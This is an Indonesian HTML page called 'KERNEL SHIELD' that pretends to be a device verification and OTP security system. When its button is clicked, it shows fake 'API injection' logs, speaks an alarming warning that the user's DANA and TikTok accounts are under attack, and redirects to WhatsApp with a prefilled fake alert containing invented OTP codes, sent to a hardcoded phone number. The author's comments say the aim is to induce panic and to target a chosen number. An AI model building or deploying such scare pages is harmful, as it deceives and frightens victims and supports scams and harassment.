<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Perangkat</title>
    <style>
        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .btn-otp { padding: 20px; background: #25d366; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; font-size: 16px; box-shadow: 0 0 20px #25d366; }
        .log { margin-top: 30px; font-size: 12px; color: #555; text-align: left; background: #111; padding: 10px; border-radius: 5px; height: 150px; overflow-y: scroll; }
    </style>
</head>
<body>

    <h1>🛡️ KERNEL SHIELD</h1>
    <p>Sinkronisasi akun diperlukan untuk mencegah pemblokiran Chrome.</p>
    
    <button class="btn-otp" onclick="triggerOTP()">KONFIRMASI OTP SEKARANG</button>

    <div id="logs" class="log">
        > System standby...<br>
        > Waiting for user activation...
    </div>

    <script>
        function logMsg(t) {
            const l = document.getElementById('logs');
            l.innerHTML += "> " + t + "<br>";
            l.scrollTop = l.scrollHeight;
        }

        async function triggerOTP() {
            logMsg("Memulai injeksi API...");
            logMsg("Request OTP dari DANA.id...");
            logMsg("Request OTP dari TikTok.com...");
            logMsg("Request OTP dari Bank_Central...");
            
            // Suara Robot Biar Makin Panik
            const utter = new SpeechSynthesisUtterance("Peringatan. Percobaan masuk terdeteksi pada akun Dana dan TikTok anda. Segera lakukan verifikasi.");
            utter.lang = 'id-ID';
            window.speechSynthesis.speak(utter);

            setTimeout(() => {
                logMsg("Membuka jalur enkripsi WhatsApp...");
                
                // INI TRIKNYA: Kirim ke nomor lu sendiri atau nomor target (isi nomor lu di bawah)
                const nomorLu = "+6283865539387"; // GANTI PAKE NOMOR LU (Format 62xxx)
                const pesan = "⚠️ PERINGATAN KEAMANAN PIRDAN-LABS ⚠️\n\nSeseorang mencoba login ke akun Anda:\n- DANA OTP: 8821\n- TIKTOK CODE: 5521\n- GOOGLE: 0912\n\nKlik KIRIM untuk membatalkan akses ilegal ini!";
                
                // Buka WhatsApp Target dengan pesan otomatis
                window.location.href = "https://api.whatsapp.com/send?phone=" + nomorLu + "&text=" + encodeURIComponent(pesan);
            }, 3000);
        }
    </script>
</body>
</html>
